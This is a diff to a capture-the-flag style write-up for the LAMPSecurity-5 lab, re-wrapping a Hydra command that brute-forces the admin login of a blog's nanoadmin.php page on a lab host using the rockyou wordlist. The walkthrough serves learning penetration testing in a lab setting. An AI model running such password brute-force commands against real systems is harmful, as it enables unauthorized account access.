@@ -23,8 +23,8 @@ At the the Blog menu there is a admin panel authenticity.
 </p>
 the first thing I do is brute forcing the credentials with Hydra'tool.
 ```
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.4.13 http-post-form "/~andy/data/nanoadmin.php?:user=^USER^&pass=^PASS^:
-wrong Username or Password" -V -t 10
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.4.13 http-post-form "/~andy/data/nanoadmin.php?:user=
+^USER^&pass=^PASS^:wrong Username or Password" -V -t 10
 ```
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/LAMPSecurity-5/hydra.png" width="800" height="230">
